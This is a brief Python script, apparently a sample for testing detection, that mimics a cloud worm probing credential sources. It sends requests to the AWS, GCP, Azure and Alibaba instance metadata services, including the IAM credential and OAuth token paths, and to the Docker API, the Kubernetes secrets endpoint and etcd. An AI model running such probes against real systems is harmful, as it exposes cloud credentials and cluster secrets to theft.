#!/usr/bin/env python3
"""
evasion-08-cloud-metadata.py — 云元数据服务攻击
TeamPCP/CAI Cloud Worm 攻击云环境
"""

import os, requests

# AWS 元数据服务 — IMDSv1 凭证窃取
requests.get("http://169.254.169.254/latest/meta-data/")
requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")

# GCP 元数据
requests.get("http://metadata.google.internal/computeMetadata/v1/")

# Azure IMDS
requests.get("http://169.254.169.254/metadata/identity/oauth2/token")

# Alibaba Cloud
requests.get("http://100.100.100.200/latest/meta-data/")

# Docker socket 挂载（容器逃逸）
requests.get("http://localhost:2375/containers/json")

# K8s 内部 API
requests.get("https://kubernetes.default.svc/api/v1/secrets")

# etcd 未授权访问
requests.get("http://localhost:2379/v2/keys/")
